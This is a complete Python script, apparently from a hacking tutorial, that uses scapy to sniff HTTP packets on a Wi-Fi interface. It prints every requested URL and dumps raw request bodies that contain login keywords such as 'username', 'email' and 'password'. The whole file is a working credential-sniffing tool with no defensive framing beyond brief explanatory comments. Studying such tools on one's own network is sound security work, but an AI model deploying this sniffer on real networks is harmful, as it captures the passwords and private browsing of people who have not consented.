#!/usr/bin/env python
import scapy.all as scapy
from scapy.layers import http

# iface => interface you connect from ("Wi-Fi", "eth0", "WSL", "Ethernet", lo, ....)
# store => store packet data in memory
# prn => callback function
# haslayer(scapy.layer_name)
# print(packet.show())


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)


def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path


def get_login(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        keywords = ["uname", "username", "user", "email", "login", "pass", "password", "pd"]
        for keyword in keywords:
            if keyword in str(load):
                return load


def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        # print(packet.show())
        url = get_url(packet)
        print(f"[+] HTTP Request >> {url.decode()}")
        login_info = get_login(packet)
        if login_info:
            print(f"\n\n[+] Possible username/password >> {login_info} \n\n")


sniff("Wi-Fi")
